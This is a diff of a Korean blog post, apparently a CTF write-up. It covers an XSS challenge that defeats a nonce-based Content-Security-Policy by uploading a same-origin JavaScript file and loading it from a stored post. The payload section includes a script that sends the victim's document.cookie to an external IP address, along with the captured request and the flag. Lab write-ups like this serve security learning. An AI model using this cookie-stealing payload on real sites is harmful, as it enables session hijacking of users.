@@ -1,54 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 6. XSS - mitigations"
+title: "KnockOn Bootcamp 2nd - 6. XSS Mitigations - CSP Bypass"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
-last_modified_at: 2024-09-11T18:20:00-05:00
+  - CSP Bypass
+last_modified_at: 2024-09-12T08:20:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10014/>
 
-![6. XSS - mitigations 1](/assets/images/writeup/web-hacking/knock-on/6_XSS_1.png)
+![6. XSS - mitigations 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-xss-1.png)
 
-![6. XSS - mitigations 2](/assets/images/writeup/web-hacking/knock-on/6_XSS_2.png)
-
-
-|
-
-|
-
-|
+![6. XSS - mitigations 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-xss-2.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
-
-|
-
-|
-
-|
+- CSP Bypass
 
 ## 문제 코드
 
@@ -97,7 +77,7 @@ nonce = secrets.token_hex(16)
 
 #SCP설정
 @app.after_request
-def set_csp(response): 
+def set_csp(response):
     response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
     return response
 
@@ -123,7 +103,7 @@ def write():
         content = request.form['content']
         title = request.form['title']
         password = request.form['password']
-        image_file = request.files['image'] 
+        image_file = request.files['image']
 
         if image_file:
             filename = (image_file.filename)
@@ -218,38 +198,22 @@ if __name__ == '__main__':
     app.run(host="0.0.0.0", port=10006, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
 ### /write
 
----
-
-![6. XSS - mitigations 3](/assets/images/writeup/web-hacking/knock-on/6_XSS_3.png)
+![6. XSS - mitigations 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-xss-3.png)
 
 파일 업로드 기능이 있음
-
-|
-
-|
-
-|
 
 ## 코드 분석
 
 ### set_csp()
 
----
-
 ```python
 #CSP설정
 @app.after_request
-def set_csp(response): 
+def set_csp(response):
     response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
     return response
 ```
@@ -260,25 +224,17 @@ def set_csp(response):
 
 모든 요청 처리 후 응답
 
-|
-
 ```python
 response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
 ```
 
-`Content-Security-Policy` CSP정책. 헤더를 설정.
+`Content-Security-Policy` CSP정책. 헤더를 설정
 
 `nonce`: 서버에서 생성한 nonce를 사용해야만 인라인 스크립트 실행 허용
 
 `self`: 현재 도메인의 스크립트만 실행 허용
 
-|
-
-|
-
 ### uploaded_file()
-
----
 
 ```bash
 UPLOAD_FOLDER = 'uploads'
@@ -298,16 +254,12 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 업로드된 파일을 저장할 폴더를 `uploads`로 설정 후 `config`설정 파일에 추가
 
-|
-
 ```python
 if not os.path.exists(app.config['UPLOAD_FOLDER']):
     os.makedirs(app.config['UPLOAD_FOLDER'])
 ```
 
 파일 저장 경로가 없으면 자동으로 생성
-
-|
 
 ```python
 @app.route('/uploads/<path:filename>')
@@ -319,13 +271,7 @@ def uploaded_file(filename):
 
 `파일 경로`와 `파일명`을 결합
 
-|
-
-|
-
 ### write()
-
----
 
 ```python
 @app.route('/write', methods=['GET', 'POST'])
@@ -334,13 +280,12 @@ def write():
         content = request.form['content']
         title = request.form['title']
         password = request.form['password']
-        image_file = request.files['image'] 
+        image_file = request.files['image']
 
         if image_file:
             filename = (image_file.filename)
             image_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
             image_file.save(image_path)
-       
 
         if len(password) < 4:
             return "Password must be at least 4 characters long."
@@ -352,15 +297,11 @@ def write():
     return render_template('write.html')
 ```
 
-|
-
 ```python
 image_file = request.files['image']
 ```
 
 업로드된 파일을 가져옴
-
-|
 
 ```python
 if image_file:
@@ -371,33 +312,25 @@ else:
     image_path = None
 ```
 
-`image_file`이 있으면 파일 업로드 경로와 파일명을 합쳐 `image_path`에 저장 후 
+`image_file`이 있으면 파일 업로드 경로와 파일명을 합쳐 `image_path`에 저장 후
 
 `save` 메서드로 `image_path`에 파일 저장
 
 파일이 없으면 `image_path`를 `None`으로 설정
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```python
 response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
 ```
 
-코드를 보면 `/`와 `/post`에서 `nonce`값이 계속 바뀜.
+코드를 보면 `/`와 `/post`에서 `nonce`값이 계속 바뀜
 
-로컬에서는 프록시 툴 등으로 `nonce`값을 알아내어 스크립트를 실행할 수 있지만, 봇을 통해 쿠키를 탈취하는 과정에서는 바뀐 `nonce`를 직접 설정할 수 없어 스크립트 실행이 불가능함.
+로컬에서는 프록시 툴 등으로 `nonce`값을 알아내어 스크립트를 실행할 수 있지만, 봇을 통해 쿠키를 탈취하는 과정에서는 바뀐 `nonce`를 직접 설정할 수 없어 스크립트 실행이 불가능함
 
 하지만 `self`로 **동일 출처의 외부 스크립트**는 실행 가능
 
 파일을 업로드하고, 해당 파일 경로로 이동하여 스크립트를 실행하도록 해야함
-
-|
 
 ```html
 <script src="/uploads/test.js"></script>
@@ -417,10 +350,6 @@ location.href="http://20.41.120.97:10010/"+document.cookie
 
 파일이 실행되면서 쿠키 탈취
 
-|
-
-|
-
 ### 결과
 
 ```sh
@@ -437,23 +366,13 @@ Accept-Language: en-US,en;q=0.9
 
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### content
-
----
 
 ```html
 <script src="/uploads/test.js"></script>
 ```
-
-|
 
 ### test.js
 
@@ -461,18 +380,8 @@ Accept-Language: en-US,en;q=0.9
 location.href="http://20.41.120.97:10010/"+document.cookie
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```jsx
 K0{You_are_insane!}
 ```
-
-|
-
----
